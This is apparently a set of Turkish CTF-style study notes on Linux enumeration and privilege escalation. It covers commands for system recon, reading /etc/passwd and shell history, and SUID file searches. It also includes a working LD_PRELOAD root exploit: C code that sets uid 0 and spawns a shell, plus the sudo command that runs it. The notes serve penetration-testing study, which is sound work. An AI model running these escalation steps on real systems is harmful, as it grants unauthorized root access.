
```bash
hostname
```
Komut hostname hedef makinenin ana bilgisayar adını döndürecektir. Bu değer kolayca değiştirilebilse veya nispeten anlamsız bir dizeye sahip olsa da (örneğin Ubuntu-3487340239), bazı durumlarda hedef sistemin kurumsal ağ içindeki rolü hakkında bilgi sağlayabilir (örneğin bir üretim SQL sunucusu için SQL-PROD-01).
---

```bash
uname -a
```
Sistem tarafından kullanılan çekirdek hakkında bize ek ayrıntılar veren sistem bilgilerini yazdıracaktır. Bu, ayrıcalık artışına yol açabilecek olası çekirdek güvenlik açıklarını ararken faydalı olacaktır.

---

```bash
cat /proc/version
```
Proc dosya sistemi (procfs), hedef sistem süreçleri hakkında bilgi sağlar. Proc'u birçok farklı Linux sürümünde bulabilirsiniz, bu da onu cephaneliğinizde bulundurmanız gereken önemli bir araç haline getirir.

Bakmak /proc/versionsize çekirdek sürümü ve derleyicinin (örneğin GCC) yüklü olup olmadığı gibi ek veriler hakkında bilgi verebilir.
---
```bash
cat /etc/issue
```
Sistemler ayrıca dosyaya bakılarak da tanımlanabilir /etc/issue. Bu dosya genellikle işletim sistemi hakkında bazı bilgiler içerir ancak kolayca özelleştirilebilir veya değiştirilebilir. Konu açılmışken, sistem bilgisi içeren herhangi bir dosya özelleştirilebilir veya değiştirilebilir. Sistem hakkında daha net bir anlayış için, bunların hepsine bakmak her zaman iyidir.
---

ps Komutu
Komut, Linuxps  sisteminde çalışan işlemleri görmenin etkili bir yoludur .  Terminalinize yazdığınızda geçerli kabuk için işlemler gösterilecektir. ps

(İşlem Durumu) çıktısı ps aşağıdakileri gösterecektir;

- PID: İşlem kimliği (işleme özgü)
- TTY: Kullanıcı tarafından kullanılan terminal türü
- Zaman: İşlem tarafından kullanılan CPU zamanı miktarı (bu, işlemin çalıştığı zaman DEĞİLDİR)
- CMD: Çalışan komut veya yürütülebilir dosya (herhangi bir komut satırı parametresini görüntülemez)
“ps” komutu birkaç yararlı seçenek sunar.

- ps -A: Çalışan tüm işlemleri görüntüle
- ps axjfps axjf: İşlem ağacını görüntüle ( aşağıda çalıştırılana kadar ağaç oluşumunu görün )
- ps aux: Bu aux seçenek tüm kullanıcılar için işlemleri gösterecek (a), işlemi başlatan kullanıcıyı gösterecek (u) ve bir terminale bağlı olmayan işlemleri gösterecektir (x). ps aux komut çıktısına baktığımızda sistem ve olası güvenlik açıkları hakkında daha iyi bir anlayışa sahip olabiliriz.

```bash
ps aux
```
---
Env variables
![image](https://github.com/user-attachments/assets/ea6b8963-10a4-4940-9c0b-0621abda5a43)

```bash
env
```
PATH değişkeni, hedef sistemde kod çalıştırmak veya ayrıcalık yükseltme için kullanılabilecek bir derleyiciye veya betik diline (örneğin Python) sahip olabilir.


---

#Yetki aramaları

```bash
sudo -l
```
Çıktıda LD_PRELOAD ortam değişkeni varsa bunu aşağıda sudo yetkileri ile kullanabiliriz 

mesela çıktıda :
```bash
env_keep+=LD_PRELOAD 
(root) NOPASSWD: /usr/bin/nmap 
```
bunu bulursak 
bir dosya içine aşağıdaki yada kendi shelimiz ne ise onu kullanabiliriz örn:

``` c++
#include <sys/types.h> #include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD");
setgid(0);
setuid(0); system("/bin/bash");
}
#include <stdio.h>
```
shell.c olarak kaydettik 

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles 
# daha sonra
sudo LD_PRELOAD=/tmp/shell.so nmap
```
burası bizi root'a götürücek 
 
```bash
whoami
#root
```

Hedef sistem, kullanıcıların bazı (veya tüm) komutları kök ayrıcalıklarıyla çalıştırmasına izin verecek şekilde yapılandırılabilir. sudo -l Komut, kullanıcınızın . kullanarak çalıştırabileceği tüm komutları listelemek için kullanılabilir sudo.

---

İD
Komut, id kullanıcının ayrıcalık düzeyi ve grup üyelikleri hakkında genel bir bakış sağlayacaktır.
```bash
id
```
id Aşağıda görüldüğü gibi komutun başka bir kullanıcı için de aynı bilgiyi almak amacıyla kullanılabileceğini hatırlatmakta fayda var .

---

```bash
cat /etc/passwd
```
veya 
 Başka bir yaklaşım da "home" için grep yapmak olabilir, çünkü gerçek kullanıcıların klasörleri büyük ihtimalle "home" dizini altında olacaktır.
Dosyayı okumak /etc/passwd sistemdeki kullanıcıları keşfetmenin kolay bir yolu olabilir.

```bash
cat /etc/passwd | grep home
```
---

``` bash
history
```
Komutla ilgili daha önceki komutlara bakmak  history bize hedef sistem hakkında fikir verebilir ve nadiren de olsa şifreler veya kullanıcı adları gibi saklanmış bilgiler içerebilir.

---

netstat
Mevcut arayüzler ve ağ rotaları için ilk kontrolün ardından, mevcut iletişimlere bakmakta fayda vardır. netstatKomut, mevcut bağlantılar hakkında bilgi toplamak için birkaç farklı seçenekle birlikte kullanılabilir.

``` bash
netstat
```

netstat -a: tüm dinleme portlarını ve kurulan bağlantıları gösterir.
netstat -atveya sırasıyla TCP veya UDP protokollerini netstat -aulistelemek için de kullanılabilir .
netstat -l: “dinleme” modunda portları listeler. Bu portlar açıktır ve gelen bağlantıları kabul etmeye hazırdır. Bu, yalnızca TCP protokolünü (aşağıda) kullanarak dinleyen portları listelemek için “t” seçeneğiyle kullanılabilir

---
Komutu bul
Hedef sistemde önemli bilgiler ve potansiyel ayrıcalık yükseltme vektörleri aramak verimli olabilir. Dahili "find" komutu kullanışlıdır ve cephaneliğinizde bulundurmaya değer.

Aşağıda “find” komutu için bazı yararlı örnekler verilmiştir.
hataları "/dev/null"a yönlendirmek ve daha temiz bir çıktı elde etmek için "find" komutunu "-type f 2>/dev/null" ile kullanmak akıllıca olacaktır 

Dosyaları bul:
Dosyayı geçerli kullanıcıdan daha yüksek bir ayrıcalık seviyesiyle çalıştırmamızı sağlayan SUID bitine sahip dosyaları bulun.
``` bash
find / -perm -u=s -type f 2>/dev/null
```

- ```bash 
  find / -user root -perm /4000  2>/dev/null
  ```
  # (***oldukça öenmli)
- ``` bash find / -type f -perm -04000 -ls 2>/dev/null ```
- groups sogrusu 
  - ``` bash find / -type f -group bugtracker 2> /dev/null ```
- ``` bash find / -writable -type d 2>/dev/null ```
  # : geçerli dizinde “flag1.txt” adlı dosyayı bulun
- ``` bash find . -name flag1.txt```
  #: /home dizinindeki “flag1.txt” dosya adlarını bulun
- ``` bash find /home -name flag1.txt```
   #: “/” altında config adlı dizini bulun
- ``` bash find / -type d -name config```
   # : 777 izinlerine sahip dosyaları bul (tüm kullanıcılar tarafından okunabilir, yazılabilir ve çalıştırılabilir dosyalar)
- ``` bash find / -type f -perm 0777```
  # : çalıştırılabilir dosyaları bul
- ``` bash find / -perm a=x ```
  #: “frank” kullanıcısına ait tüm dosyaları “/home” altında bul 
- ``` bash find /home -user frank ```
  # : Son 10 günde değiştirilen dosyaları bul
- ``` bash find / -mtime 10 ```
  #: Son 10 günde erişilen dosyaları bul
- ``` bash find / -atime 10 ```
  #: Son bir saat (60 dakika) içinde değiştirilen dosyaları bul
- ``` bash find / -cmin -60 ```
  #: Son bir saat (60 dakika) içinde erişilen dosyaları bul
- ``` bash find / -amin -60 ```
  #: 50 MB boyutundaki dosyaları bul
- ``` bash find / -size 50M  ```
Bu komut, belirtilen boyuttan daha büyük veya daha küçük bir dosyayı belirtmek için (+) ve (-) işaretleriyle birlikte de kullanılabilir.

``` bash
find . -name flag1.txt
```

---
